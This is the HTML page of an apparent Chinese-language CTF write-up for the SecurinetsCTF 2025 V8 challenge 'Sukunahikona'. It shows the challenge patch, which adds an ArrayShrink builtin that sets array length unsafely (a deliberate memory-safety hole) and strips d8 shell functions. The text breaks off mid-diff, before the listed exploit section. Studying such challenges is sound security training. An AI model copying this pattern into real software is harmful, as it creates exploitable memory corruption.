<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="写在最前面👴要成为像 XiaozaYa 师傅那样的全栈神   漏洞分析与利用首先给出 patch 代码patch 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757">
<meta property="og:type" content="article">
<meta property="og:title" content="SecurinetsCTF 2025 Sukunahikona">
<meta property="og:url" content="https://qanux.github.io/2025/10/06/sv8/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="写在最前面👴要成为像 XiaozaYa 师傅那样的全栈神   漏洞分析与利用首先给出 patch 代码patch 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-10-05T16:00:00.000Z">
<meta property="article:modified_time" content="2025-10-06T09:03:03.753Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>SecurinetsCTF 2025 Sukunahikona</title>
    <!-- async scripts -->
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?dfa426831961b1170306cf91cfce69b4";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
    
    
    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">Link</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/09/28/2025%E5%B0%8F%E7%90%90%E7%A2%8E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/10/06/sv8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/10/06/sv8/&text=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/10/06/sv8/&is_video=false&description=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SecurinetsCTF 2025 Sukunahikona&body=Check out this article: https://qanux.github.io/2025/10/06/sv8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/10/06/sv8/&name=SecurinetsCTF 2025 Sukunahikona&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/10/06/sv8/&t=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析与利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit-js"><span class="toc-number">3.</span> <span class="toc-text">exploit.js</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        SecurinetsCTF 2025 Sukunahikona
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-10-05T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-10-06</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>👴要成为像 XiaozaYa 师傅那样的全栈神  </p>
<h2 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h2><p>首先给出 patch 代码<br><strong>patch</strong></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/REVISION b/REVISION</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 00000000000..39757636311</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/REVISION</span></span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line"><span class="addition">+5a2307d0f2c5b650c6858e2b9b57b335a59946ff</span></span><br><span class="line">\ No newline at end of file</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index ea45a7ada6b..2552c286b60 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -624,6 +624,45 @@</span> BUILTIN(ArrayShift) &#123;</span><br><span class="line"> </span><br><span class="line">   return GenericArrayShift(isolate, receiver, length);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="addition">+BUILTIN(ArrayShrink) &#123;</span></span><br><span class="line"><span class="addition">+  HandleScope scope(isolate);</span></span><br><span class="line"><span class="addition">+  Factory *factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; receiver = args.receiver();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast&lt;JSArray&gt;(*receiver))) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(</span></span><br><span class="line"><span class="addition">+      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;Oldest trick in the book&quot;))</span></span><br><span class="line"><span class="addition">+    );</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSArray&gt; array = Cast&lt;JSArray&gt;(receiver);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (args.length() != 2) &#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(</span></span><br><span class="line"><span class="addition">+      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;specify length to shrink to &quot;))</span></span><br><span class="line"><span class="addition">+    );</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  </span></span><br><span class="line"><span class="addition">+  uint32_t old_len = static_cast&lt;uint32_t&gt;(Object::NumberValue(array-&gt;length()));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; new_len_obj;</span></span><br><span class="line"><span class="addition">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, new_len_obj, Object::ToNumber(isolate, args.at(1)));</span></span><br><span class="line"><span class="addition">+  uint32_t new_len = static_cast&lt;uint32_t&gt;(Object::NumberValue(*new_len_obj));</span></span><br><span class="line"><span class="addition">+  </span></span><br><span class="line"><span class="addition">+  if (new_len &gt;= old_len)&#123;</span></span><br><span class="line"><span class="addition">+    THROW_NEW_ERROR_RETURN_FAILURE(</span></span><br><span class="line"><span class="addition">+      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewStringFromAsciiChecked(&quot;invalid length&quot;))</span></span><br><span class="line"><span class="addition">+    );</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  array-&gt;set_length(Smi::FromInt(new_len));</span></span><br><span class="line"><span class="addition">+  </span></span><br><span class="line"><span class="addition">+  return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayUnshift) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 78cbf8874ed..dc60d59e637 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -424,6 +424,8 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* ES6 #sec-array.prototype.shift */                                         \</span><br><span class="line">   CPP(ArrayShift)                                                              \</span><br><span class="line"><span class="addition">+  CPP(ArrayShrink)                                                             \</span></span><br><span class="line"><span class="addition">+                                                                               \</span></span><br><span class="line">   /* ES6 #sec-array.prototype.unshift */                                       \</span><br><span class="line">   CPP(ArrayUnshift)                                                            \</span><br><span class="line">   /* Support for Array.from and other array-copying idioms */                  \</span><br><span class="line"><span class="comment">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">index facf0d86d79..045e93e94c8 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.cc</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.cc</span></span><br><span class="line"><span class="meta">@@ -3370,47 +3370,47 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">                        FunctionTemplate::New(isolate, Version));</span><br><span class="line"> </span><br><span class="line">   global_template-&gt;Set(isolate, &quot;print&quot;, FunctionTemplate::New(isolate, Print));</span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;printErr&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, PrintErr));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;write&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, WriteStdout));</span></span><br><span class="line"><span class="deletion">-  if (!i::v8_flags.fuzzing) &#123;</span></span><br><span class="line"><span class="deletion">-    global_template-&gt;Set(isolate, &quot;writeFile&quot;,</span></span><br><span class="line"><span class="deletion">-                         FunctionTemplate::New(isolate, WriteFile));</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;read&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ReadFile));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;readbuffer&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ReadBuffer));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;readline&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ReadLine));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;load&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ExecuteFile));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span></span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, SetTimeout));</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;printErr&quot;,</span></span><br><span class="line"><span class="addition">+  //                      FunctionTemplate::New(isolate, PrintErr));</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;write&quot;,</span></span><br><span class="line"><span class="addition">+  //                      FunctionTemplate::New(isolate, WriteStdout));</span></span><br><span class="line"><span class="addition">+  // if (!i::v8_flags.fuzzing) &#123;</span></span><br><span class="line"><span class="addition">+  //   global_template-&gt;Set(isolate, &quot;writeFile&quot;,</span></span><br><span class="line"><span class="addition">+  //                        FunctionTemplate::New(isolate, WriteFile));</span></span><br><span class="line"><span class="addition">+  // &#125;</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;read&quot;,</span></span><br><span class="line"><span class="addition">+  //                      FunctionTemplate::New(isolate, ReadFile));</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;readbuffer&quot;,</span></span><br><span class="line"><span class="addition">+  //                      FunctionTemplate::New(isolate, ReadBuffer));</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;readline&quot;,</span></span><br><span class="line"><span class="addition">+  //                      FunctionTemplate::New(isolate, ReadLine));</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;load&quot;,</span></span><br><span class="line"><span class="addition">+  //                      FunctionTemplate::New(isolate, ExecuteFile));</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span></span><br><span class="line"><span class="addition">+  //                      FunctionTemplate::New(isolate, SetTimeout));</span></span><br><span class="line">   // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line">   // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span><br><span class="line">   // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span><br><span class="line"><span class="deletion">-  if (!options.omit_quit) &#123;</span></span><br><span class="line"><span class="deletion">-    global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;testRunner&quot;,</span></span><br><span class="line"><span class="deletion">-                       Shell::CreateTestRunnerTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;performance&quot;,</span></span><br><span class="line"><span class="deletion">-                       Shell::CreatePerformanceTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));</span></span><br><span class="line"><span class="addition">+  // if (!options.omit_quit) &#123;</span></span><br><span class="line"><span class="addition">+  //   global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span></span><br><span class="line"><span class="addition">+  // &#125;</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;testRunner&quot;,</span></span><br><span class="line"><span class="addition">+  //                      Shell::CreateTestRunnerTemplate(isolate));</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;Realm&quot;, Shell::CreateRealmTemplate(isolate));</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;performance&quot;,</span></span><br><span class="line"><span class="addition">+  //                      Shell::CreatePerformanceTemplate(isolate));</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;Worker&quot;, Shell::CreateWorkerTemplate(isolate));</span></span><br><span class="line"> </span><br><span class="line">   // Prevent fuzzers from creating side effects.</span><br><span class="line"><span class="deletion">-  if (!i::v8_flags.fuzzing) &#123;</span></span><br><span class="line"><span class="deletion">-    global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));</span></span><br><span class="line"><span class="addition">+  // if (!i::v8_flags.fuzzing) &#123;</span></span><br><span class="line"><span class="addition">+  //   global_template-&gt;Set(isolate, &quot;os&quot;, Shell::CreateOSTemplate(isolate));</span></span><br><span class="line"><span class="addition">+  // &#125;</span></span><br><span class="line"><span class="addition">+  // global_template-&gt;Set(isolate, &quot;d8&quot;, Shell::CreateD8Template(isolate));</span></span><br><span class="line"> </span><br><span class="line"><span class="deletion">-  if (i::v8_flags.expose_async_hooks) &#123;</span></span><br><span class="line"><span class="deletion">-    global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span></span><br><span class="line"><span class="deletion">-                         Shell::CreateAsyncHookTemplate(isolate));</span></span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="addition">+  // if (i::v8_flags.expose_async_hooks) &#123;</span></span><br><span class="line"><span class="addition">+  //   global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span></span><br><span class="line"><span class="addition">+  //                        Shell::CreateAsyncHookTemplate(isolate));</span></span><br><span class="line"><span class="addition">+  // &#125;</span></span><br><span class="line"> </span><br><span class="line">   return global_template;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">@@ -3719,10 +3719,10 @@</span> void Shell::Initialize(Isolate* isolate, D8Console* console,</span><br><span class="line">             v8::Isolate::kMessageLog);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-  isolate-&gt;SetHostImportModuleDynamicallyCallback(</span></span><br><span class="line"><span class="deletion">-      Shell::HostImportModuleDynamically);</span></span><br><span class="line"><span class="deletion">-  isolate-&gt;SetHostInitializeImportMetaObjectCallback(</span></span><br><span class="line"><span class="deletion">-      Shell::HostInitializeImportMetaObject);</span></span><br><span class="line"><span class="addition">+  // isolate-&gt;SetHostImportModuleDynamicallyCallback(</span></span><br><span class="line"><span class="addition">+  //     Shell::HostImportModuleDynamically);</span></span><br><span class="line"><span class="addition">+  // isolate-&gt;SetHostInitializeImportMetaObjectCallback(</span></span><br><span class="line"><span class="addition">+  //     Shell::HostInitializeImportMetaObject);</span></span><br><span class="line">   isolate-&gt;SetHostCreateShadowRealmContextCallback(</span><br><span class="line">       Shell::HostCreateShadowRealmContext);</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index 48249695b7b..c8c5c2eda25 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -2535,6 +2535,9 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           true);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;concat&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeConcat, 1, false);</span><br><span class="line"><span 